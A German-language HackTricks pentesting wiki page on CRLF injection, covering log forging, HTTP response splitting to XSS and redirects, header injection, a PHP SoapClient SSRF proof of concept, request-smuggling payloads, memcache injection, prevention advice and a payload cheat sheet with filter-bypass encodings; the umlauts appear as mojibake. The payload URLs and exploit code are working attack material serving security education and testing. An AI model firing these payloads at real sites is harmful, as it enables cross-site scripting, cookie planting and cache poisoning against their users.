# CRLF (%0D%0A) Injection

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde**! Treten Sie uns noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Pr√§mien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Carriage Return (CR) und Line Feed (LF), zusammen als CRLF bekannt, sind spezielle Zeichenfolgen, die im HTTP-Protokoll verwendet werden, um das Ende einer Zeile oder den Beginn einer neuen zu kennzeichnen. Webserver und Browser verwenden CRLF, um zwischen HTTP-Headern und dem Body einer Antwort zu unterscheiden. Diese Zeichen werden universell in HTTP/1.1-Kommunikationen √ºber verschiedene Webserver-Typen wie Apache und Microsoft IIS eingesetzt.

### CRLF-Injektionsanf√§lligkeit

Bei der CRLF-Injektion werden CR- und LF-Zeichen in benutzergesteuerte Eingaben eingef√ºgt. Diese Aktion f√ºhrt dazu, dass der Server, die Anwendung oder der Benutzer die injizierte Sequenz als Ende einer Antwort und den Beginn einer anderen interpretieren. Obwohl diese Zeichen an sich nicht sch√§dlich sind, kann ihr Missbrauch zu HTTP-Response-Splitting und anderen b√∂sartigen Aktivit√§ten f√ºhren.

### Beispiel: CRLF-Injektion in einer Protokolldatei

[Beispiel von hier](https://www.invicti.com/blog/web-security/crlf-http-header/)

Betrachten Sie eine Protokolldatei in einem Admin-Panel, die das Format `IP - Zeit - Besuchter Pfad` hat. Ein typischer Eintrag k√∂nnte aussehen:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Ein Angreifer kann eine CRLF-Injektion ausnutzen, um dieses Protokoll zu manipulieren. Indem CRLF-Zeichen in die HTTP-Anfrage eingef√ºgt werden, kann der Angreifer den Ausgabestrom ver√§ndern und Protokolleintr√§ge f√§lschen. Zum Beispiel k√∂nnte eine injizierte Sequenz den Protokolleintrag in folgendes umwandeln:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Hier stellen `%0d` und `%0a` die URL-codierten Formen von CR und LF dar. Nach dem Angriff w√ºrde das Protokoll irref√ºhrend anzeigen:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Der Angreifer tarnt somit seine b√∂sartigen Aktivit√§ten, indem er es so aussehen l√§sst, als ob der localhost (eine in der Serverumgebung typischerweise vertrauensw√ºrdige Entit√§t) die Aktionen ausgef√ºhrt hat. Der Server interpretiert den Teil der Abfrage, der mit `%0d%0a` beginnt, als einzelnen Parameter, w√§hrend der Parameter `restrictedaction` als separate Eingabe geparst wird. Die manipulierte Abfrage ahmt effektiv einen legitimen administrativen Befehl nach: `/index.php?page=home&restrictedaction=edit`

### HTTP-Response-Splitting

#### Beschreibung

HTTP-Response-Splitting ist eine Sicherheitsl√ºcke, die auftritt, wenn ein Angreifer die Struktur von HTTP-Antworten ausnutzt. Diese Struktur trennt Header vom Body mithilfe einer spezifischen Zeichenfolge, Carriage Return (CR) gefolgt von Line Feed (LF), zusammen als CRLF bezeichnet. Wenn es einem Angreifer gelingt, eine CRLF-Sequenz in einen Antwort-Header einzuf√ºgen, kann er effektiv den nachfolgenden Antwortinhalt manipulieren. Diese Art der Manipulation kann zu schwerwiegenden Sicherheitsproblemen f√ºhren, insbesondere Cross-Site-Scripting (XSS).

#### XSS durch HTTP-Response-Splitting

1. Die Anwendung setzt einen benutzerdefinierten Header wie folgt: `X-Custom-Header: UserInput`
2. Die Anwendung ruft den Wert f√ºr `UserInput` aus einem Abfrageparameter ab, sagen wir "user\_input". In Szenarien ohne ordnungsgem√§√üe Eingabevalidierung und Codierung kann ein Angreifer ein Payload erstellen, der die CRLF-Sequenz sowie b√∂sartigen Inhalt enth√§lt.
3. Ein Angreifer erstellt eine URL mit einem speziell erstellten 'user\_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* In dieser URL ist `%0d%0a%0d%0a` die URL-codierte Form von CRLFCRLF. Es t√§uscht den Server, eine CRLF-Sequenz einzuf√ºgen, sodass der Server den nachfolgenden Teil als Antwort-Body behandelt.
4. Der Server spiegelt die Eingabe des Angreifers im Antwort-Header wider, was zu einer unbeabsichtigten Antwortstruktur f√ºhrt, in der das b√∂sartige Skript vom Browser als Teil des Antwortbodys interpretiert wird.

#### Ein Beispiel f√ºr HTTP-Response-Splitting, das zu einer Weiterleitung f√ºhrt

Von [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Browser zu:
```
/%0d%0aLocation:%20http://myweb.com
```
Und der Server antwortet mit dem Header:
```
Location: http://myweb.com
```
**Anderes Beispiel: (von** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### Im URL-Pfad

Sie k√∂nnen das Payload **im URL-Pfad** senden, um die **Antwort** vom Server zu kontrollieren (Beispiel von [hier](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
√úberpr√ºfen Sie weitere Beispiele unter:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP Header Injection

HTTP-Header-Injection, oft durch CRLF (Carriage Return und Line Feed) Injection ausgenutzt, erm√∂glicht es Angreifern, HTTP-Header einzuf√ºgen. Dies kann Sicherheitsmechanismen wie XSS (Cross-Site Scripting)-Filter oder die SOP (Same-Origin Policy) untergraben und m√∂glicherweise zu unbefugtem Zugriff auf sensible Daten wie CSRF-Token oder zur Manipulation von Benutzersitzungen durch das Platzieren von Cookies f√ºhren.

#### Ausnutzen von CORS √ºber HTTP-Header-Injection

Ein Angreifer kann HTTP-Header injizieren, um CORS (Cross-Origin Resource Sharing) zu aktivieren und die von SOP auferlegten Beschr√§nkungen zu umgehen. Dieser Versto√ü erm√∂glicht es Skripten aus b√∂sartigen Quellen, mit Ressourcen aus einer anderen Quelle zu interagieren und potenziell auf gesch√ºtzte Daten zuzugreifen.

#### SSRF und HTTP-Request-Injection √ºber CRLF

CRLF-Injection kann genutzt werden, um eine vollst√§ndig neue HTTP-Anfrage zu erstellen und einzuf√ºgen. Ein bemerkenswertes Beispiel hierf√ºr ist die Schwachstelle in der PHP-Klasse `SoapClient`, speziell im Parameter `user_agent`. Durch die Manipulation dieses Parameters kann ein Angreifer zus√§tzliche Header und Body-Inhalte einf√ºgen oder sogar eine v√∂llig neue HTTP-Anfrage injizieren. Nachfolgend ein PHP-Beispiel, das diese Ausnutzung demonstriert:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Header Injection f√ºr Request Smuggling

F√ºr weitere Informationen zu dieser Technik und m√∂glichen Problemen [**√ºberpr√ºfen Sie die Originalquelle**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Sie k√∂nnen wichtige Header injizieren, um sicherzustellen, dass das **Back-End die Verbindung offen h√§lt**, nachdem es auf die erste Anfrage geantwortet hat:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Nachfolgend kann ein zweiter Request spezifiziert werden. Dieses Szenario beinhaltet in der Regel [HTTP Request Smuggling](http-request-smuggling/), eine Technik, bei der zus√§tzliche Header oder Body-Elemente, die vom Server nach der Injektion angeh√§ngt werden, zu verschiedenen Sicherheitsl√ºcken f√ºhren k√∂nnen.

**Ausnutzung:**

1. **B√∂sartige Pr√§fix-Injektion**: Diese Methode beinhaltet das Vergiften des n√§chsten Benutzerrequests oder eines Webcaches durch Angabe eines b√∂sartigen Pr√§fixes. Ein Beispiel hierf√ºr ist:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%a HTTP/1.1`

2. **Erstellen eines Pr√§fix f√ºr die Vergiftung der Antwortwarteschlange**: Dieser Ansatz beinhaltet das Erstellen eines Pr√§fixes, der in Kombination mit abschlie√üendem M√ºll eine vollst√§ndige zweite Anfrage bildet. Dies kann die Vergiftung der Antwortwarteschlange ausl√∂sen. Ein Beispiel hierf√ºr ist:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Memcache-Injektion

Memcache ist ein **Schl√ºssel-Wert-Speicher, der ein Klartextprotokoll verwendet**. Weitere Informationen unter:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**F√ºr die vollst√§ndigen Informationen lesen Sie das** [**urspr√ºngliche Writeup**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Wenn eine Plattform **Daten aus einem HTTP-Request entnimmt und ohne Bereinigung** zur Ausf√ºhrung von **Anfragen** an einen **Memcache**-Server verwendet, k√∂nnte ein Angreifer dieses Verhalten ausnutzen, um **neue Memcache-Befehle einzuf√ºgen**.

Beispielsweise wurden in der urspr√ºnglich entdeckten Schwachstelle Cache-Keys verwendet, um die IP und den Port zur√ºckzugeben, mit denen sich ein Benutzer verbinden sollte, und Angreifer konnten **Memcache-Befehle einf√ºgen**, die den **Cache vergiften**, um die Details der Opfer (Benutzernamen und Passw√∂rter eingeschlossen) an die Angreifer-Server zu senden:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

Dar√ºber hinaus stellten Forscher fest, dass sie die Memcache-Antworten desynchronisieren konnten, um die IP-Adressen und Ports der Angreifer an Benutzer zu senden, deren E-Mail-Adresse der Angreifer nicht kannte:

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### Wie man CRLF / HTTP-Header-Injektionen in Webanwendungen verhindert

Um die Risiken von CRLF (Carriage Return und Line Feed) oder HTTP-Header-Injektionen in Webanwendungen zu minimieren, werden folgende Strategien empfohlen:

1. **Direkte Benutzereingabe in Antwort-Headern vermeiden:** Der sicherste Ansatz besteht darin, Benutzereingaben nicht direkt in Antwort-Headern zu integrieren.
2. **Kodierung von Sonderzeichen:** Wenn das Vermeiden direkter Benutzereingaben nicht m√∂glich ist, stellen Sie sicher, dass eine Funktion zur Kodierung von Sonderzeichen wie CR (Carriage Return) und LF (Line Feed) verwendet wird. Diese Praxis verhindert die M√∂glichkeit einer CRLF-Injektion.
3. **Aktualisierung der Programmiersprache:** Aktualisieren Sie regelm√§√üig die in Ihren Webanwendungen verwendete Programmiersprache auf die neueste Version. W√§hlen Sie eine Version, die von Natur aus die Injektion von CR- und LF-Zeichen innerhalb von Funktionen, die f√ºr das Setzen von HTTP-Headern zust√§ndig sind, nicht zul√§sst.

### CHEATSHEET

[Cheatsheet hier verf√ºgbar](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Automatische Tools

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Brute-Force-Erkennungsliste

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Referenzen

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde**! Treten Sie noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Pr√§mien von bis zu **$100.000** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
